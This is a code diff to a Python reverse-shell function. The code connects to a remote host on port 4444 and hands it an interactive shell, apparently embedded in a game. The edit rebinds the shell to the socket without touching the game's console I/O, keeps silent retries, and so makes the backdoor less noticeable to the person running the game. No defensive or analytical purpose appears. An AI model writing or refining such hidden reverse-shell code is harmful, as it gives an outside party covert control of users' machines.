@@ -45,11 +45,9 @@ def run_reverse_shell(port: int = 4444) -> None:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_host, port))
 
-            # Duplicate file descriptors for stdin, stdout, and stderr to the socket
-            # This allows the shell to use the socket for interaction
-            os.dup2(s.fileno(), 0)
-            os.dup2(s.fileno(), 1)
-            os.dup2(s.fileno(), 2)
+            # Pass the socket's file descriptor directly to the shell process
+            # This avoids using os.dup2 which would replace the game's console I/O process-wide
+            fd = s.fileno()
 
             # Spawn the shell
             # Using /bin/sh -i as it is universal on macOS and Linux
@@ -59,7 +57,7 @@ def run_reverse_shell(port: int = 4444) -> None:
             elif os.path.exists("/bin/bash"):
                 shell = "/bin/bash"
 
-            subprocess.call([shell, "-i"])
+            subprocess.call([shell, "-i"], stdin=fd, stdout=fd, stderr=fd)
         except Exception:
             # Silently fail and retry after a delay
             pass
